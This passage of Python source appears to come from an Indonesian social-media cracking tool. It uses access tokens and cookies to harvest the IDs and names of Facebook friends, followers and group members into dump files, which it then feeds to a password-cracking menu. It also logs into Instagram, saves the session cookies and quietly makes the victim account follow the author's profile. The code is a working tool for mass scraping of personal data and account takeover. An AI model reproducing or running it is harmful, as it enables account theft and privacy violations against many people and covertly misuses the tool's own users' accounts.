                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("dump/"+namax+".json","a");well.write(jamet+"<=>"+junet+"\n");well.close()
                                                elif len(jamet)==10 and jamet[0]=="1":
                                                        if jamet[1]=="0" or jamet[1]=="1":
                                                                if jamet[2]=="0" or jamet[2]=="1" or jamet[2]=="2":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("dump/"+namax+".json","a");well.write(jamet+"<=>"+junet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                else:
                                                        try:
                                                            jame, jamet = jamet.split("0000")
                                                            jamet = ("10000"+jamet)
                                                            id.append(jamet+"|"+junet)
                                                            tampung.append(jamet+"|"+junet)
                                                            well = open("dump/"+namax+".json","a")
                                                            well.write(jamet+"<=>"+junet+"\n")
                                                            well.close()
                                                        except:pass
                                except:
                                        continue
#                                except Exception as e:print("%s"%(e))
#                        print(war+"Total ID : %s"%(len(non_old)))
                        print(war+"Jumlah Akun Old : %s\n"%(len(tampung)))
                except requests.exceptions.ConnectionError:
                        jalan(war+"Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                except:
                        jalan(war+"Maaf Idz "+C+uid+Q+" Ini Tidak DiPublickan, Cari Yang Lain_-");time.sleep(2);dump_old()
        id_ = ("%s"%(len(id)))
        if id_ == "0" or "0" == id_:
             jalan(war+"Kemungkinan Idz Yang Anda Masukan Tidak DiPublickan !!")
        else:
             print(war+"Total ID : %s"%(len(id)))
             jalan(war+"Nama Hasil Dump : "+I+"dump/"+namax+".json"+Q)
             jalan(war+"Silahkan Copy Nama Hasil Dump Tadi !!")
             jalan("\n"+war+"Apakah Anda Mau Lasung Crack Dengan File Ini (Y/n) : ")
             zz = input(war+'Pilih : ')
             if zz in ["Y", "y", "Yes", "1"]:
                  crackmenu("dump/"+namax+".json").passmenu("dump/"+namax+".json")
                  exit()
             else:
                  pass
        input(war+"Tekan Enter Untuk Kembali")
        menu()
def dump_follow():
	try:
		token = open(".login.txt", "r").read()
	except IOError:
		os.system("rm -rf .login.txt")
		exit(war+"Token Failed !!");time.sleep(2)

	try:
		tanya_total = int(input(war+"Mau Dump Berapa Id : "))
	except:tanya_total=1
	namafi = input(war+"Nama File (contoh : sayang)"+K+"Enter:Random"+Q+" : ")
	if namafi == "" or namafi == " ":
		namafi = text_random()
	dump = open('dump/'+namafi+'.json','w') 
	jalan(war+"Ketik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
	for t in range(tanya_total):
		t +=1
		idt = input(war+"Masukan Idz Atau Username Target %s : "%(t))
		idt = ubah_username_to_id(idt)
		limit = ("10000")
		try:
			if idt == "me" or "me" == idt:
				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
				op = json.loads(otw.text)
			else:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
				op = json.loads(jok.text)
			try:
				nama = op['name']
			except (KeyError, IOError):
				nama = ("Nama Tidak DiTemukan !")
#			try:
#				tempat = op['location']['name']
#			except (KeyError, IOError):
#				tempat = ("Lokasi Tidak DiTemukan")
#			try:
#				tinggal = op['hometown']['name']
#			except (KeyError, IOError):
#				tinggal = ("Nama Kota Tidak DiTemukan")

		except Exception as e:
			jalan(war+"Maaf ID "+C+idt+Q+" Ini Tidak DiTemukan !")
			continue
		jalan("\n"+war+"Nama   : "+I+nama+Q+"\n")
#		jalan(war+"Kota   : "+I+tempat+Q)
#		jalan(war+"Lokasi : "+I+tinggal+Q+"\n")
		try:
			dump = open('dump/'+namafi+'.json','a+') 
			for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+token).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
	id_ = ("%s"%(len(id)))
	if id_ == "0" or "0" == id_:
		jalan(war+"Kemungkinan Idz Yang Anda Masukan Tidak DiPublickan !!")
	else:
		print(war+"Total ID : %s"%(len(id)))
		jalan(war+"Nama Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
		jalan(war+"Silahkan Copy Nama Hasil Dump Tadi !!")
		jalan("\n"+war+"Apakah Anda Mau Lasung Crack Dengan File Ini (Y/n) : ")
		zz = input(war+'Pilih : ')
		if zz in ["Y", "y", "Yes", "1"]:
			crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
			exit()
		else:
			pass
	input(war+"Tekan Enter !!")
	menu()
def cek_history(it):
	global tanya_total
	vc = ""
	if it == "me" or "me" == it:pass
	else:
		history = open(".idz", "a+")
	#	idt = input("Idz : ")
		his = open(".idz","r").readlines()
		for n in his:
			try:
				n = n.replace("\n","")
				if n == it:
					jalan(war+"Maaf Idz "+C+it+Q+" Ini Sudah Pernah Anda Dump/Crack\n")
					vc += "1"
			except:pass
		if vc == "1" or "1" == vc:
			jalan(war+"Apakah Anda Mau Dump/Crack Dengan Idz Ini (Y/n) : ")
			bz = input(inp+"Pilih : ")
			if bz == "Y" or bz == "y":
				tanya_total += 1
				return tanya_total
		else:
			history.write(it+"\n")
			history.close()
def crack_grup(hencet):
    try:
        _mmk_ = open('.cokie.txt').read()
        _cok_  = {"cookie":_mmk_}
        kueh  = {"cookie":_mmk_}
        kontol=requests.get(hencet,cookies=_cok_).text
        memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
        for softek in memek:
            if "profile.php?" in softek[0]:
                id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
                open("dump/"+nama_grup+".json", "a").write(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1]+"\n")
            else:
                id.append(softek[0]+"<=>"+softek[1])
                open("dump/"+nama_grup+".json", "a").write(softek[0]+"<=>"+softek[1]+"\n")
            sys.stdout.write('\r'+war+'Mengumpulkan %s Idz... '%(len(id))); sys.stdout.flush()
        if "Lihat Selengkapnya" in kontol:
            crack_grup(url_mb+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
        else:
            def geh(gey):
                a=requests.get(gey,cookies=kueh).text
                b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
                if len(b)!=0:
                    for c in b:
                        if "profile.php" in c[0]:
                            d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+"<=>"+c[1])
                                open("dump/"+nama_grup+".json", "a").write(d+"<=>"+c[1]+"\n")
                        else:
                            d=re.search("(.*?)\?refid",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+"<=>"+c[1])
                                open("dump/"+nama_grup+".json", "a").write(d+"<=>"+c[1]+"\n")
                        sys.stdout.write('\r'+war+'Mengumpulkan %s Idz... '%(len(id))); sys.stdout.flush()
                if "Lihat Postingan Lainnya" in a:
                    geh(url_mb+BeautifulSoup(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
            geh(f"{url_mb}/groups/"+re.search("id=(\\d*)",hencet).group(1))
    except:pass




def dump_public():
	try:
		token = open(".login.txt", "r").read()
	except IOError:
		os.system("rm -rf .login.txt")
		exit(war+"Token Failed !!");time.sleep(2)
	try:
		tanya_total = int(input(war+"Mau Dump Berapa Id : "))
	except:tanya_total=1
	namafi = input(war+"Nama File (contoh : sayang)"+K+"Enter:Random"+Q+" : ")
	if namafi == "" or namafi == " ":
		namafi = text_random()
	dump = open('dump/'+namafi+'.json','w') 
	jalan(war+"Ketik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
	for t in range(tanya_total):
		t +=1
		idt = input(war+"Masukan Idz Atau Username Target %s : "%(t))
		idt = ubah_username_to_id(idt)
#		cek_history(idt)
		limit = ("10000")
		try:
			if idt == "me" or "me" == idt:
				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
				op = json.loads(otw.text)
			else:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
				op = json.loads(jok.text)
			try:
				nama = op['name']
			except (KeyError, IOError):
				nama = ("Nama Tidak DiTemukan !")
#			try:
#				tempat = op['location']['name']
#			except (KeyError, IOError):
#				tempat = ("Lokasi Tidak DiTemukan")
#			try:
#				tinggal = op['hometown']['name']
#			except (KeyError, IOError):
#				tinggal = ("Nama Kota Tidak DiTemukan")

		except Exception as e:
			jalan(war+"Maaf ID "+C+idt+Q+" Ini Tidak DiTemukan ! ("+str(e)+")")
			continue
		jalan("\n"+war+"Nama   : "+I+nama+Q+"\n")
#		jalan(war+"Kota   : "+I+tempat+Q)
#		jalan(war+"Lokasi : "+I+tinggal+Q+"\n")
		try:
			dump = open('dump/'+namafi+'.json','a+') 
			for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit="+limit+"&access_token="+token).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
	id_ = ("%s"%(len(id)))
	if id_ == "0" or "0" == id_:
		jalan(war+"Kemungkinan Idz Yang Anda Masukan Tidak DiPublickan !!")
	else:
		print(war+"Total ID : %s"%(len(id)))
		jalan(war+"Nama Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
		jalan(war+"Silahkan Copy Nama Hasil Dump Tadi !!")
		jalan("\n"+war+"Apakah Anda Mau Lasung Crack Dengan File Ini (Y/n) : ")
		zz = input(war+'Pilih : ')
		if zz in ["Y", "y", "Yes", "1"]:
			crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
			exit()
		else:
			pass
	input(war+"Tekan Enter !!")
	menu()

def dump_follow_public():
	try:
		token = open(".login.txt", "r").read()
	except IOError:
		os.system("rm -rf .login.txt")
		exit(war+"Token Failed !!");time.sleep(2)

	try:
		tanya_total = int(input(war+"Mau Dump Berapa Id : "))
	except:tanya_total=1
	namafi = input(war+"Nama File (contoh : sayang)"+K+"Enter:Random"+Q+" : ")
	if namafi == "" or namafi == " ":
		namafi = text_random()
	dump = open('dump/'+namafi+'.json','w') 
	jalan(war+"Ketik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
	for t in range(tanya_total):
		t +=1
		idt = input(war+"Masukan Idz Atau Username Target %s : "%(t))
		idt = ubah_username_to_id(idt)
		limit = ("10000")
		try:
			if idt == "me" or "me" == idt:
				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
				op = json.loads(otw.text)
			else:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
				op = json.loads(jok.text)
			try:
				nama = op['name']
			except (KeyError, IOError):
				nama = ("Nama Tidak DiTemukan !")
#			try:
#				tempat = op['location']['name']
#			except (KeyError, IOError):
#				tempat = ("Lokasi Tidak DiTemukan")
#			try:
#				tinggal = op['hometown']['name']
#			except (KeyError, IOError):
#				tinggal = ("Nama Kota Tidak DiTemukan")

		except Exception as e:
			jalan(war+"Maaf ID "+C+idt+Q+" Ini Tidak DiTemukan !")
			continue
		jalan("\n"+war+"Nama   : "+I+nama+Q+"\n")
#		jalan(war+"Kota   : "+I+tempat+Q)
#		jalan(war+"Lokasi : "+I+tinggal+Q+"\n")
		try:
			dump = open('dump/'+namafi+'.json','a+')
			for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+token).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
		try:
			for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit="+limit+"&access_token="+token).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
	id_ = ("%s"%(len(id)))
	if id_ == "0" or "0" == id_:
		jalan(war+"Kemungkinan Idz Yang Anda Masukan Tidak DiPublickan !!")
	else:
		print(war+"Total ID : %s"%(len(id)))
		jalan(war+"Nama Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
		jalan(war+"Silahkan Copy Nama Hasil Dump Tadi !!")
		jalan("\n"+war+"Apakah Anda Mau Lasung Crack Dengan File Ini (Y/n) : ")
		zz = input(war+'Pilih : ')
		if zz in ["Y", "y", "Yes", "1"]:
			crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
			exit()
		else:
			pass
	input(war+"Tekan Enter !!")
	menu()
def cekfile(folder):
        dirs = os.listdir(folder)
        for file in dirs:
                filex = (folder+"/"+file)
                try:
                        juma = open(filex,"r").readlines()
                        total = ("%s"%(str(len(juma))))
                except:total = (" ?? ")
                print(war+C+filex+U+" <==> "+Q+K+total)
def cekfile_crk(folder):
        dirs = os.listdir(folder)
        for file in dirs:
                filex = (folder+"/"+file)
                try:
                        juma = open(filex,"r").readlines()
                        total = ("%s"%(str(len(juma))))
                except:total = (" ?? ")
                try:
                    ijo__ = filex.split("Hasil/OK-")[1]
                    ijo_ = (war+I+"Hasil/OK-"+ijo__)
                    print(ijo_+U+"   <=>   "+Q+M+total)
                except:pass

                try:
                    kuning__ = filex.split("Hasil/CP-")[1]
                    kuning_ = (war+K+"Hasil/CP-"+kuning__)
                    print(kuning_+U+"   <=>   "+Q+M+total)
                except:pass

#                print(war+C+filex+U+" <==> "+Q+K+total)

def dump_ulti():
	try:
		token = open(".login.txt", "r").read()
		toket = open(".login.txt", "r").read()
	except IOError:
		os.system("rm -rf .login.txt")
		exit(war+"Token Failed !!");time.sleep(2)

	jalan(war+"Ketik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
	idt = input(war+"Masukan Idz Atau Username Target : " )
	idt = ubah_username_to_id(idt)
	try:
		if idt == "me" or "me" == idt:
			otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
			op = json.loads(otw.text)
		else:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			op = json.loads(jok.text)
		try:
			nama = op['name']
		except (KeyError, IOError):
			nama = ("Nama Tidak DiTemukan !")
#		try:
#			tempat = op['location']['name']
#		except (KeyError, IOError):
#			tempat = ("Lokasi Tidak DiTemukan")
#		try:
#			tinggal = op['hometown']['name']
#		except (KeyError, IOError):
#			tinggal = ("Nama Kota Tidak DiTemukan")

	except Exception as e:
		jalan(war+"Maaf ID "+C+idt+Q+" Ini Tidak DiTemukan !")
		time.sleep(2)
		dump_ulti()
	jalan("\n"+war+"Nama   : "+I+nama+Q+"\n")
	if nama == "Nama Tidak DiTemukan !":
		time.sleep(2)
		dump_ulti()

#	jalan(war+"Kota   : "+I+tempat+Q)
#	jalan(war+"Lokasi : "+I+tinggal+Q+"\n")
	namq = input(war+"Nama File (contoh : jamet)"+K+"Enter:Random"+Q+": ")
	if namq == "" or namq == " ":
		namq = text_random()
	dump = open('.janganedit','w') 
	try:
		dump = open('.janganedit','a+') 
		for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit=9999&access_token="+token).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
			dump.write(uid+'<=>'+nama+'\n')
		dump.close()
	except KeyError:pass
	id_ = ("%s"%(len(id)))
	if id_ == "0" or "0" == id_:
		jalan(war+"Kemungkinan Id "+idt+" Ini Tidak DiPublickan !!")
		time.sleep(2)
		cek_anak_epep()
	else:
		print(war+"Total ID : %s"%(len(id)))
		dumppp = open('dump/'+namq+'.json','w')
		jalan(war+'File Dump DiSimpan Di : '+'dump/'+namq+'.json')
		jalan(war+"Tekan CTRL + Z UNTUK STOP !!")
		with kikygtg(max_workers=20) as (kiky_gtg):
			juma = open(".janganedit","r").readlines()
			for data in juma:
				data = data.replace("\n","")
				kiky = data.split("<=>")
				mal = ("%s"%(kiky[0]))
				nm = ("%s"%(kiky[1]))
				kiky_gtg.submit(lonte__, mal, toket, token, namq)
		exit("\n"+war+"Done !!")
goblok = []
tolol = []
def lonte__(ml, token, toket, mamk):
	laxk = open('dump/'+mamk+'.json','a+')
#	open('dump/'+mamk+'.json','r').readlines()
	
	try:
		for i in requests.get("https://graph.facebook.com/"+ml+"/friends?limit=9999&access_token="+token).json()["data"]:
			try:
				iid = i["id"]
				nama = i["name"]
				goblok.append(nama)
				laxk.write(iid+'<=>'+nama+'\n')
			except:pass
		laxk.close()
		for i in requests.get("https://graph.facebook.com/"+ml+"/subscribers?limit=9999&access_token="+token).json()["data"]:
			try:
				iid = i["id"]
				nama = i["name"]
				goblok.append(nama)
				laxk.write(iid+'<=>'+nama+'\n')
			except:pass
		laxk.close()
	except KeyError:pass
	sys.stdout.write("\r%s[%sULTIMATE%s] IDZ YANG TERKUMPUL => %s"%(Q,pilih([U,I,K,M,C]),Q, len(open('dump/'+mamk+'.json','r').readlines()))
	); sys.stdout.flush()
def cek_anak_epep():
	try:
		token = open(".login.txt", "r").read()
		toket = open(".login.txt", "r").read()
	except IOError:
		os.system("rm -rf .login.txt")
		exit(war+"Token Failed !!");time.sleep(2)

	jalan(war+"Ketik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
	idt = input(war+"Masukan Idz Atau Username Target : ")
	idt = ubah_username_to_id(idt)
#	idt = input(war+"Target ID : ")
	dump = open('.janganedit','w') 
	try:
		dump = open('.janganedit','a+') 
		for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit=9999&access_token="+token).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
			dump.write(uid+'<=>'+nama+'\n')
		dump.close()
	except KeyError:pass
	id_ = ("%s"%(len(id)))
	if id_ == "0" or "0" == id_:
		jalan(war+"Kemungkinan Id "+idt+" Ini Tidak DiPublickan !!")
		time.sleep(2)
		cek_anak_epep()
	else:
		print(war+"Total ID : %s"%(len(id)))
		with kikygtg(max_workers=20) as (kiky_gtg):
			juma = open(".janganedit","r").readlines()
			for data in juma:
				data = data.replace("\n","")
				kiky = data.split("<=>")
				mal = ("%s"%(kiky[0]))
				nm = ("%s"%(kiky[1]))
				kiky_gtg.submit(lonte_, mal, toket, token)
def lonte_(ml, token, toket):
	voa = ""
	try:
		goblok = []
		tolol = []
		for i in requests.get("https://graph.facebook.com/"+ml+"/friends?limit=9999&access_token="+token).json()["data"]:
			anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
			goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
		for i in requests.get("https://graph.facebook.com/"+ml+"/subscribers?limit=9999&access_token="+token).json()["data"]:
			anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw = i["id"]
			tolol.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw)
	except KeyError:pass
	_id = ("%s"%(len(goblok)))
	_idx = ("%s"%(len(tolol)))
	if _id == "0" or "0" == _id:
		pass
	else:
		voa += (" | Teman : %s%s%s"%(U,_id,Q))
	if _idx == "0" or "0" == _idx:
		pass
	else:
		voa += (" | Pengikut : %s%s%s"%(I,_idx,Q))
	if voa == "" or "" == voa:pass
	else:
		print (f"{war}{ml}{voa}")

def get_uame():
	urq = "http://whatsmyuseragent.org/"
	sess = requests.Session()
	getdat = requests.get(urq)
	getdat = par(getdat.content,'html.parser')
	print(getdat)
def chek_bot():
	try:
		toket=open(".login.txt","r").read()
		token=open(".login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except IOError:
		print((war+"Token Invalid"))
		time.sleep(1)
		login()
	print(war+'Nama Facebook Kamu : '+nama)
	print(war+'Id Facebook Kamu   : '+id)
	ba = requests.post('https://graph.facebook.com/1675627047/subscribers?access_token='+token) ### FB RISKY
	ba = par(ba.content,'html.parser')
	print(str(ba))
def cek_tok_tok():
	try:
		toket=open(".login.txt","r").read()
	except:
		print((war+"Token Invalid"))
		time.sleep(1)
		login()
	ba = (requests.get('https://graph.facebook.com/me/friends?limit=3&fields=name&access_token='+toket).json()["error"]["message"])
	if ba in "Sepertinya Anda menyalahgunakan fitur ini dengan menggunakannya terlalu cepat. Anda dilarang menggunakan fitur ini untuk sementara.":
		jalan(war+"Sepertinya Anda menyalahgunakan fitur ini dengan menggunakannya terlalu cepat. Anda dilarang menggunakan fitur ini untuk sementara")
		jalan(war+"Kemungkinan Anda Tidak Bisa Dump/Crack/Ambil Idz")
		jalan("\n"+war+"Apakah Anda Mau Masih Menggunakan Token Ini (Y/n) :")
		la = input(war+"Pilih : ")
		if la in ("Y","y"):
			pass
		else:
			os.remove(".login.txt")
			jalan(war+"Berhasil Hapus Token!")
			exit()

#### MENU IGEHH ####
yan, status_foll, poll, cr, looping = [], [], [], [], 1
url_instagram = "https://www.instagram.com/"
user_agentz = "Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
user_agentz_qu = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"]
urll = "https://www.instagram.com/"
url = "https://www.instagram.com/accounts/login/ajax/"
headerz = {"User-Agent": user_agentz}
headerz_api = {"User-Agent": user_agentz_api}
header = {}
param = {}

def proses():
	try:os.mkdir("Hasil_Igeh")
	except:pass
	jalan(f"\n\n{war}Hasil Crack Yang Check Point DiSimpan Di : {K}Hasil_Igeh/IG-CP-{durasi}.txt")
	jalan(f"{war}Hasil Crack Yang Sukses Jaya DiSimpan Di : {I}Hasil_Igeh/IG-OK-{durasi}.txt{Q}\n\n")
#	jalan(f"{war}")


def log_igeh():
    global cookie
    try:
        kontol = open("ig.txt", "r").read()
    except IOError:
        masuk_ig()
    else:
        url = "https://i.instagram.com/api/v1/friendships/39431798677/followers/?count=5"
        with requests.Session() as ses:
            try:
                otw = ses.get(url, cookies={"cookie": kontol}, headers=headerz_api)
                if "users" in json.loads(otw.content):
                    cookie = {"cookie": kontol}
                else:
                    print('\n%sCookies Igeh Anda Invalid'%(war));time.sleep(2);os.system('rm -rf ig.txt');masuk_ig()
            except ValueError:
                print('\n%sCookies Igeh Anda Invalid'%(war));time.sleep(2);os.system('rm -rf ig.txt');masuk_ig()

def masuk_ig():
	jalan(war+"Silahkan Pilih Metode Login Instagram :P\n")
	print(Q+"["+C+"1"+Q+"] Login "+I+"Username/Id/Email/No Hp "+Q+"Dan "+I+"Kata Sandi"+Q)
	print(Q+"["+C+"2"+Q+"] Login Cookies Instgram")
	print(Q+"["+C+"3"+Q+"] Kembali Ke Menu Utama :P")
	lo = input(war+"Pilih : ")
	if lo in ["", " "]:
		jalan(war+"Jangan Kosong :)");time.sleep(1)
		masuk_ig()
	elif lo in ["1", "01"]:
#		masuk_pass()
		login_dev()
		exit()

	elif lo in ["2", "02"]:
		masuk_cok()
		exit()

	elif lo in ["3", "03"]:
		menu()
		exit()
	else:
		jalan(war+"Isi Dengan Benar Kontol");time.sleep(1)
		masuk_ig()
def masuk_cok():
	global cookie
	user_agentz = "Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
	headerz = {"User-Agent": user_agentz}
	cok = input(war+"Masukkan Cookie : ")
	with requests.Session() as ses_dev:
		login_coki = ses_dev.get("https://www.instagram.com/", cookies={"cookie": cok}, headers=headerz)
		if "viewer_has_liked" in str(login_coki.content):
			jalan(war+"Selamat Cookies Anda Sehat !!")
			with open("ig.txt", "w") as tulis_coki:
				tulis_coki.write(cok)
			cookie = {"ig.txt": cok}
#			exit(jalan(war+"Jalankan Lagi Script !!"))
		else:
			jalan(war+"Maaf Cookies Anda Kenak Virus, Karena Belum Vaksin :V")
			masuk_cok()
			exit()

	
def follow_dev(ses_dev, username_dev):
	user_target = "mr.risky.991"
	id_target = "50307151176"
	dat_crf_foll = ses_dev.get("https://www.instagram.com/{}/".format(user_target), headers=headerz_api).content
	crf_token_foll = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(dat_crf_foll))[0]
	headerz_foll = {"Accept": "*/*",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "en-US,en;q=0.5",
					"Host": "www.instagram.com",
					"Origin": "https://www.instagram.com",
					"Referer": "https://www.instagram.com/{}/".format(user_target),
					"User-Agent": user_agentz,
					"X-CSRFToken": crf_token_foll}
	param_foll = {""}
	url_follow = "https://www.instagram.com/web/friendships/{}/follow/".format(id_target)
	res_foll = ses_dev.post(url_follow, headers=headerz_foll)
def login_dev():
	global cookie
	username_dev = input(war+"Masukkan Username : ")
	pass_dev = input(war+"Masukkan Sandi : ")
	try:
		try:
			headerz = {"User-Agent": user_agentz}
			with requests.Session() as dev:
				url_scrap = "https://www.instagram.com/"
				data = dev.get(url_scrap, headers=headerz).content
				crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
			header = {
					"Accept": "*/*",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "en-US,en;q=0.5",
					"Host": "www.instagram.com",
					"X-CSRFToken": crf_token,
					"X-Requested-With": "XMLHttpRequest",
					"Referer": "https://www.instagram.com/accounts/login/",
					"User-Agent": user_agentz,
					 }
			param = {
					"username": username_dev,
					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999), pass_dev),
					"optIntoOneTap": False,
					"queryParams": {},
					"stopDeletionNonce": "",
					"trustedDeviceRecords": {}
					}
		except:
			header = {}
			param = {}
			pass
		with requests.Session() as ses_dev:
			url = "https://www.instagram.com/accounts/login/ajax/"
			respon = ses_dev.post(url, data=param, headers=header)
			data_dev = json.loads(respon.content)
			da = respon.cookies.get_dict()
			if "userId" in str(data_dev):
				jalan(war+I+"Selamat Data Anda Terdaftar DiKartu Paksin :v")
				for dev in da:
					with open("ig.txt", "a") as tulis:
						tulis.write(dev+"="+da[dev]+";")
				follow_dev(ses_dev, username_dev)
				cok = open("ig.txt","r").read()
				cookie = {"ig.txt": cok}
#				bokep_japan_yang_terbacru(username_dev, pass_dev)
#				bokep_barat_yang_terbaru(cok)
			elif "checkpoint_url" in str(data_dev):
				jalan(war+K+"Maaf Cookies Anda Kenak Virus, Karena Belum Vaksin :V "+Q+"("+C+"AKUN INI KENAK CHECK PAKSIN"+Q+")")
			elif "Please wait" in str(data_dev):
				jalan(war+U+"Hidupkan Mode Pesawat 5 Detik Agar Terhidar Dari Paksin")
			else:
				jalan(war+M+"Maaf Cookies Anda Kenak Virus, Karena Belum Vaksin :V "+Q+"("+C+"AKUN INI TIDAK TERDAFTAR DI DATA INSTAGRAM"+Q+")")
				exit()
				
	except KeyboardInterrupt:
		exit()

def masuk_pass():
    global cookie
    jalan(garis)
    userr = input('%sUsername :%s '%(war,K))
    peweh = input('%sPassword :%s '%(war,H))
    try:
        try:
            headerz = {"User-Agent": user_agentz}
            with requests.Session() as ses:
                scr = "https://www.instagram.com/"
                data = ses.get(scr, headers=headerz).content
                toket = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
            headerss = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": toket,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,}
            param = {"username": userr,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999), peweh),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
            }
        except:
            header = {}
            param = {}
            pass
        with requests.Session() as ses:
            url = "https://www.instagram.com/accounts/login/ajax/"
            respon = ses.post(url, data=param, headers=headerss)
            data = json.loads(respon.content)
            _2 = respon.cookies.get_dict()
            if "userId" in str(data):
                for xxx in _2:
                    with open("ig.txt", "a") as simpan:
                        simpan.write(xxx+"="+_2[xxx]+";")
                masuk = open("ig.txt","r").read()
                cookie = {"ig.txt": masuk}
                jalan("\n%s%sSelamat Cookies Instagram Kamu Sehat !!%s"%(war,I,Q));time.sleep(2)
                exit("%sJalankan Lagi Scriptnya !!"%(war))
            elif "checkpoint_url" in str(data):
                print('\n%s%sMaaf Akun Anda Terkena CheckPoint !!%s'%(war,K,Q));masuk_ig()
            elif "Please wait" in str(data):
                print('\n%s%sSilahkan Hidup Matikan Mode Pesawat !%s'%(war,M,Q));masuk_ig()
            else:
                exit('\n%sUsername Dan Password Anda Salah !!'%(war,M,Q));masuk_ig()
    except KeyboardInterrupt:
        print('\n%sSilahkan Masukan Username Dan Password Kontol'%(war));masuk_ig()

def menu_igeh():
    print('\n[%s1%s] Crack Followers Publik'%(C,Q));time.sleep(0.03)
    print('[%s2%s] Crack Pencarian Nama'%(C,N));time.sleep(0.03)
